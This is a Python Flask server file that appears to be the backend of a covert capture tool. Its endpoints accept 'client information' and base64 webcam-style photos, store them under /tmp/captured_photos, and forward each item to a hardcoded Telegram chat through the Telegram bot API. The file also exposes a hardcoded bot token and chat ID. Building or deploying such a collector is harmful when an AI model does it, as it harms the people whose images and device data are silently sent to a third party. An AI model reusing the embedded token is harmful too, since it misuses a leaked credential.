from flask import Flask, request, jsonify, render_template
import os
import base64
import json
import requests
from datetime import datetime

app = Flask(__name__)

# Create directories in /tmp (Vercel's writable directory)
PHOTO_DIR = "/tmp/captured_photos"
INFO_DIR = "/tmp/client_info"
os.makedirs(PHOTO_DIR, exist_ok=True)
os.makedirs(INFO_DIR, exist_ok=True)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = '7842091597:AAGtnLil1fTmAy_sk__U5yQoun0f8-WBjSA'  # Replace with your bot's API token
CHAT_ID = '1901173676'  # Replace with the target chat ID where you want to send messages

# Function to send a text message via Telegram
def send_telegram_message(message, chat_id):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': chat_id,
        'text': message,
    }
    response = requests.post(url, data=payload)
    return response.json()

# Function to send a photo via Telegram
def send_telegram_photo(photo_path, chat_id):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        payload = {'chat_id': chat_id}
        response = requests.post(url, data=payload, files=files)
    return response.json()

# Webhook to handle incoming updates from Telegram
@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()

    # Check if the message is from a user
    if 'message' in data and 'text' in data['message']:
        user_message = data['message']['text']
        chat_id = data['message']['chat']['id']

        if user_message == "/start":
            # Start command - send a welcome message with options
            welcome_message = "Welcome! Click below to start the collection process."
            send_telegram_message(welcome_message, chat_id)

        elif user_message == "/help":
            # Help command - explain how to use the bot
            help_message = (
                "Here are the available commands:\n\n"
                "/start - Start the collection process\n"
                "/info - Get information about the bot\n"
                "/help - Display this help message"
            )
            send_telegram_message(help_message, chat_id)

        elif user_message == "/info":
            # Info command - provide info about the bot
            info_message = (
                "This bot allows you to collect client information and photos. "
                "You can use the following commands:\n\n"
                "/start - Start the collection process\n"
                "/help - Show this message\n"
                "All collected data will be stored and sent to the admin."
            )
            send_telegram_message(info_message, chat_id)

        else:
            # Default response for unrecognized commands
            unknown_command_message = "Sorry, I didn't understand that command. Type /help to get a list of available commands."
            send_telegram_message(unknown_command_message, chat_id)

    return jsonify({'status': 'ok'}), 200


@app.route("/collect", methods=["POST"])
def collect_info():
    try:
        data = request.json
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(INFO_DIR, f"client_{timestamp}.json")
        
        with open(filename, "w") as f:
            json.dump(data, f, indent=4)
        
        # Send the collected data to Telegram
        message = f"New client information collected:\n\n{json.dumps(data, indent=4)}"
        send_telegram_message(message, CHAT_ID)

        return jsonify({"message": "Client info saved successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/upload-photo", methods=["POST"])
def upload_photo():
    try:
        data = request.json
        photo_data = data.get("photo", "")
        if not photo_data.startswith("data:image/jpeg;base64,"):
            return jsonify({"error": "Invalid image format"}), 400
        
        # Decode and save image
        photo_data = photo_data.replace("data:image/jpeg;base64,", "")
        img_data = base64.b64decode(photo_data)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(PHOTO_DIR, f"photo_{timestamp}.jpg")

        with open(filename, "wb") as f:
            f.write(img_data)
        
        # Send the photo to Telegram
        send_telegram_photo(filename, CHAT_ID)

        return jsonify({"message": "Photo saved and sent successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=True)
